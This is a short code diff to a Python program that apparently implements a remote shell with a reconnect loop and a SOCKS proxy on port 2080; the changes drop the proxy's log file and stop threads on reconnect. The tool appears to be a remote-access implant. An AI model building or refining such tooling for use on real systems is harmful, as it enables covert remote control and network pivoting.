@@ -14,7 +14,7 @@ def windows_only(func):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(junk)
 	return tester
-	
+
 class StoppableThread(threading.Thread):
 	def __init__(self, target):
 		super(StoppableThread, self).__init__()
@@ -164,7 +164,7 @@ class Shell:
 		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
 	def socks_proxy_thread(self):
-		reactor.listenTCP(2080,socks.SOCKSv4Factory("./socks.log"))
+		reactor.listenTCP(2080,socks.SOCKSv4Factory())
 		reactor.run()
 		
 	def start_socks_proxy(self):
@@ -275,5 +275,7 @@ while True:
 	except Exception as e:
 		print e
 		shell.comm_socket.close()
+		for t in shell.threads:
+			t.stop()
 		time.sleep(10)
 		continue
